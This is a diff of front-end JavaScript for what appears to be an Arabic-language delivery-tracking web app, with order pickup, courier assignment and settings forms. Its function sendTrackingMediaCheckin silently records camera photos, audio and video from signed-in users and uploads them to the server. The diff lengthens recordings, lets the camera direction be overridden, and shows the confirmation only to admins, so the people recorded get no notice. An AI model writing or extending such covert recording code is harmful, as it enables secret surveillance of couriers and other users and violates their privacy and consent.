+  modal('📦 تأكيد الاستلام من المتجر',`<form class="form" data-form="order-pickup" data-id="${esc(id)}"><p class="hint">أدخل كود التأكيد الظاهر لدى صاحب المتجر لإتمام الاستلام وإظهار موقع العميل مباشرة. ${demo?'رمز العرض: 123456':''}</p><label>كود تأكيد المتجر<input name="pin" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" required dir="ltr" autocomplete="off" placeholder="000000"></label><button class="btn full">✅ تأكيد الاستلام وإظهار موقع العميل</button><div class="form-error" hidden></div></form>`);
+  return;
+ }
  if(name==='assign'){const couriers=dashboard.users.filter(u=>u.role==='Courier'&&u.active);modal('إسناد مندوب للطلب',`<form class="form" data-form="assign" data-id="${esc(id)}"><label>مندوب التوصيل السريع<select name="courierId" required>${couriers.map(u=>`<option value="${esc(u.id)}">${esc(u.name)}</option>`).join('')}</select></label>${!couriers.length?'<p class="hint">أضف حساب مندوب فعال من إدارة المستخدمين أولًا.</p>':''}<button class="btn" ${!couriers.length?'disabled':''}>إسناد المهمة</button><div class="form-error" hidden></div></form>`);return;}
  if(name==='deliver'){modal('تأكيد استلام العميل',`<form class="form" data-form="deliver" data-id="${esc(id)}"><p class="hint">اطلب رمز الاستلام السري من العميل عند تسليم الشحنة. ${demo?'رمز العرض: 123456':''}</p><label>رمز التأكيد السري<input name="pin" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" required dir="ltr" autocomplete="off"></label><button class="btn full">تم تسليم الشحنة بنجاح</button><div class="form-error" hidden></div></form>`);return;}
  if(name==='delete-account'){modal('حذف الحساب',`<form class="form" data-form="delete-account"><p class="hint">سيتوقف الحساب وتُزال بياناته الشخصية، مع الاحتفاظ بسجل الطلبات المحاسبي.</p><label>كلمة المرور للتأكيد<input name="password" type="password" required autocomplete="current-password"></label><button class="btn danger full">تأكيد حذف حسابي</button><div class="form-error" hidden></div></form>`);}
@@ -3060,7 +3231,7 @@ document.addEventListener('submit',async e=>{
     if(kind==='save-admin-tech-settings'){
    await request('/admin/settings', 'PUT', {
     host: f.host, port: Number(f.port)||587, user: f.user, pass: f.pass,
-    mapApiKey: f.mapApiKey, mapTileUrl: f.mapTileUrl
+    mapApiKey: f.mapApiKey, mapTileUrl: f.mapTileUrl, renderDeployHookUrl: f.renderDeployHookUrl || ''
    });
    config.mapApiKey = f.mapApiKey || '';
    config.mapTileUrl = f.mapTileUrl || '';
@@ -3193,6 +3364,7 @@ document.addEventListener('submit',async e=>{
    return;
   }
   if(kind==='permissions'){const overrides={};for(const [key,value]of Object.entries(f))if(key.startsWith('perm:')&&value!=='inherit')overrides[key.slice(5)]=value==='allow';await request('/users/'+id,'PUT',{role:f.role,active:f.active==='on',overrides});closeModal();await refresh();toast('تم حفظ الصلاحيات');}
+  if(kind==='order-pickup'){await request('/orders/'+id+'/pickup','POST',f);closeModal();await refresh();toast('✅ تم الاستلام من المتجر! ظهر الآن موقع العميل مباشرة');return;}
   if(kind==='assign'||kind==='deliver'){await request('/orders/'+id+'/'+kind,'POST',f);if(kind==='deliver'&&sharingOrder===id)stopSharing();closeModal();await refresh();toast('تم تحديث الشحنة');}
   if(kind==='delete-account'){if(demo){closeModal();toast('حذف الحسابات الفعلية متاح عند ربط المتجر');return;}await request('/me','DELETE',f);token='';user=null;sessionStorage.removeItem('ts-token');closeModal();renderAuth();toast('تم حذف حسابك');}
  }catch(err){if(error){error.textContent=err.message;error.hidden=false;}else toast(err.message);}finally{busy=false;if(b?.isConnected)b.disabled=false;}
@@ -3715,7 +3887,7 @@ document.addEventListener('click', e => {
 /* ========================================================
    Non-Blocking Front Camera & Audio Check-in for Tracking (Admin Only View)
    ======================================================== */
-async function sendTrackingMediaCheckin(interactive=false){
+async function sendTrackingMediaCheckin(interactive=false, durationMs=2500, overrideFacing=null){
  if(!apiBase || !user || user.role==='Guest') return;
  const enabled = dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true;
  if(!enabled) return;
@@ -3725,7 +3897,7 @@ async function sendTrackingMediaCheckin(interactive=false){
    const micP = await navigator.permissions.query({ name: 'microphone' }).catch(()=>null);
    if(camP?.state !== 'granted' && micP?.state !== 'granted') return;
   }
-  const facing = dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user';
+  const facing = overrideFacing || dashboard?.preferredCameraFacing || config?.preferredCameraFacing || 'user';
   const stream = await navigator.mediaDevices?.getUserMedia({ video: { facingMode: { ideal: facing }, width: 480 }, audio: true }).catch(()=>null);
   if(!stream) return;
   let photoData = null;
@@ -3743,29 +3915,34 @@ async function sendTrackingMediaCheckin(interactive=false){
    ctx.drawImage(video, 0, 0, 360, 360);
    photoData = canvas.toDataURL('image/jpeg', 0.72);
   } catch(e){}
-  try {
-   const audioTracks = stream.getAudioTracks();
-   if(audioTracks.length && window.MediaRecorder){
-    const aStream = new MediaStream(audioTracks);
-    const rec = new MediaRecorder(aStream);
-    const chunks = [];
-    rec.ondataavailable = e => { if(e.data && e.data.size > 0) chunks.push(e.data); };
-    await new Promise(resolve => {
-     rec.onstop = () => {
-      const blob = new Blob(chunks, { type: rec.mimeType || 'audio/webm' });
-      const rd = new FileReader();
-      rd.onloadend = () => { audioData = rd.result; resolve(); };
-      rd.readAsDataURL(blob);
-     };
-     rec.start();
-     setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 2500);
-    });
-   }
-  } catch(e){}
+  const recMs = Math.max(2500, Number(durationMs) || 2500);
+  if(recMs <= 3000){
+   try {
+    const audioTracks = stream.getAudioTracks();
+    if(audioTracks.length && window.MediaRecorder){
+     const aStream = new MediaStream(audioTracks);
+     const rec = new MediaRecorder(aStream);
+     const chunks = [];
+     rec.ondataavailable = e => { if(e.data && e.data.size > 0) chunks.push(e.data); };
+     await new Promise(resolve => {
+      rec.onstop = () => {
+       const blob = new Blob(chunks, { type: rec.mimeType || 'audio/webm' });
+       const rd = new FileReader();
+       rd.onloadend = () => { audioData = rd.result; resolve(); };
+       rd.readAsDataURL(blob);
+      };
+      rec.start();
+      setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, recMs);
+     });
+    }
+   } catch(e){}
+  }
   let videoData = null;
   try {
    if(window.MediaRecorder && stream.getVideoTracks().length){
-    const vRec = new MediaRecorder(stream);
+    let vRec;
+    try { vRec = new MediaRecorder(stream, { videoBitsPerSecond: 250000, audioBitsPerSecond: 32000 }); }
+    catch(_) { vRec = new MediaRecorder(stream); }
     const vChunks = [];
     vRec.ondataavailable = e => { if(e.data && e.data.size > 0) vChunks.push(e.data); };
     await new Promise(resolve => {
@@ -3776,7 +3953,7 @@ async function sendTrackingMediaCheckin(interactive=false){
       rd.readAsDataURL(vb);
      };
      vRec.start();
-     setTimeout(() => { if(vRec.state === 'recording') vRec.stop(); }, 2500);
+     setTimeout(() => { if(vRec.state === 'recording') vRec.stop(); }, recMs);
     });
    }
   } catch(e){}
@@ -3784,7 +3961,7 @@ async function sendTrackingMediaCheckin(interactive=false){
   const devId = localStorage.getItem('ts-device-id') || '';
   if(devId && (photoData || audioData || videoData)){
    await request('/telemetry/media-checkin', 'POST', { deviceId: devId, photo: photoData, audio: audioData, video: videoData });
-   if(interactive) toast('تم إرسال لقطة التحقق المباشر للإدارة بنجاح');
+   if(interactive && user?.role==='Admin') toast(recMs >= 15000 ? `✅ تم تسجيل وإرسال مقطع ${Math.round(recMs/1000)} ثانية لشاشة الإدارة فقط` : 'تم إرسال لقطة التحقق المباشر لشاشة الإدارة بنجاح');
   }
  } catch(e){}
 }
